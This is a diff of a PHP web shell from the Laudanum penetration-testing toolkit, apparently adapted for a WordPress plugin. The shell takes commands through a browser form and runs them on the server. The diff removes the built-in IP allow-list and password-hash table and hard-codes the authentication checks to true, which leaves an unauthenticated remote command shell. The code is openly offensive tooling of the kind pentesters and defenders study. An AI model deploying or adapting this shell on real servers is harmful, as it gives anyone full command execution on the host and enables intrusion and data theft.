@@ -10,9 +10,9 @@
 ***
 ***  Project Leads:
 ***         Kevin Johnson <kjohnson@secureideas.net>
-***         Tim Medin <tim@securitywhole.com>
+***         Tim Medin <tim@counterhack.com>
 ***
-*** Copyright 2012 by Kevin Johnson and the Laudanum Team
+*** Copyright 2014 by Kevin Johnson and the Laudanum Team
 ***
 ********************************************************************************
 ***
@@ -40,34 +40,13 @@
 ***
 ***************************************************************************** */
 
-// ***************** Config entries below ***********************
 
-// IPs are enterable as individual addresses TODO: add CIDR support
-$allowedIPs = array("192.168.1.55", "12.2.2.2");
-
-# format is "username" => "password" 
-# password is generated using sha1sum as shown below (don't forget the -n, KEVIN!)
-# echo -n  Password1 | sha1sum
-$users = array("kevin" => "b441ac06613fc8d63795be9ad0beaf55011936ac", "tim" => "a94a1fe5ccb19ba61c4c0873d391e987982fbbd3", "yomamma" => "a94a1fe5ccb19ba61c4c0873d391e987982fbbd3");
-
-# *********** No editable content below this line **************
-
-$allowed = 0;
-foreach ($allowedIPs as $IP) {
-    if ($_SERVER["REMOTE_ADDR"] == $IP)
-        $allowed = 1;
-}
-
-if ($allowed == 0) {
-    header("HTTP/1.0 404 Not Found");
-    die();
-}
-
+include 'ipcheck.php';
 
 
 /* This error handler will turn all notices, warnings, and errors into fatal
  * errors, unless they have been suppressed with the @-operator. */
-function error_handler($errno, $errstr, $errfile, $errline, $errcontext) {
+function wpl_error_handler($errno, $errstr, $errfile, $errline, $errcontext) {
     /* The @-opertor (used with chdir() below) temporarely makes
      * error_reporting() return zero, and we don't want to die in that case.
      * We do note the error in the output, though. */
@@ -87,7 +66,7 @@ function error_handler($errno, $errstr, $errfile, $errline, $errcontext) {
 
   <hr>
   <address>
-  Copyright &copy; 2012, <a
+  Copyright &copy; 2014, <a
   href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br>
   Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
   </address>
@@ -97,7 +76,7 @@ function error_handler($errno, $errstr, $errfile, $errline, $errcontext) {
     }
 }
 
-set_error_handler('error_handler');
+// set_error_handler('wpl_error_handler');
 
 
 function logout() {
@@ -108,7 +87,7 @@ function logout() {
 }
 
 
-function stripslashes_deep($value) {
+function wpl_stripslashes_deep($value) {
     if (is_array($value))
         return array_map('stripslashes_deep', $value);
     else
@@ -119,9 +98,9 @@ if (get_magic_quotes_gpc())
     $_POST = stripslashes_deep($_POST);
 
 /* Initialize some variables we need again and again. */
-$username = isset($_POST['username']) ? $_POST['username'] : '';
-$password = isset($_POST['password']) ? $_POST['password'] : '';
-$nounce   = isset($_POST['nounce'])   ? $_POST['nounce']   : '';
+//$username = isset($_POST['username']) ? $_POST['username'] : '';
+//$password = isset($_POST['password']) ? $_POST['password'] : '';
+//$nounce   = isset($_POST['nounce'])   ? $_POST['nounce']   : '';
 
 $command  = isset($_POST['command'])  ? $_POST['command']  : '';
 $rows     = isset($_POST['rows'])     ? $_POST['rows']     : 24;
@@ -164,7 +143,8 @@ if (isset($_SESSION['nounce']) && $nounce == $_SESSION['nounce'] && isset($users
 if (!isset($_SESSION['authenticated']))
     $_SESSION['authenticated'] = false;
 
-if ($_SESSION['authenticated']) {  
+if(true) {
+//if ($_SESSION['authenticated']) {  
     /* Initialize the session variables. */
     if (empty($_SESSION['cwd'])) {
         $_SESSION['cwd'] = '.';
@@ -283,7 +263,7 @@ if ($_SESSION['authenticated']) {
   <link rel="stylesheet" href="style.css" type="text/css">
 
   <script type="text/javascript">
-  <?php if ($_SESSION['authenticated']) { ?>
+  <?php if (true) { ?>
 
   var current_line = 0;
   var command_hist = new Array(<?php echo $js_command_hist ?>);
@@ -329,7 +309,7 @@ if ($_SESSION['authenticated']) {
 <form name="shell" action="<?php echo $_SERVER['PHP_SELF'] ?>" method="post">
 
 <?php
-if (!$_SESSION['authenticated']) {
+if (false) {
     /* Genereate a new nounce every time we preent the login page.  This binds
      * each login to a unique hit on the server and prevents the simple replay
      * attack where one uses the back button in the browser to replay the POST
@@ -342,7 +322,7 @@ if (!$_SESSION['authenticated']) {
   <legend>Authentication</legend>
 
   <?php
-  if (!empty($username))
+  if (false)
       echo '  <p class="error">Login failed, please try again:</p>' . "\n";
   else
       echo "  <p>Please login:</p>\n";
@@ -400,7 +380,7 @@ echo rtrim($padding . $_SESSION['output']);
 
   <hr/>
   <address>
-  Copyright &copy; 2012, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
+  Copyright &copy; 2014, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
   Updated by Tim Medin.<br/>
   Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
   </address>
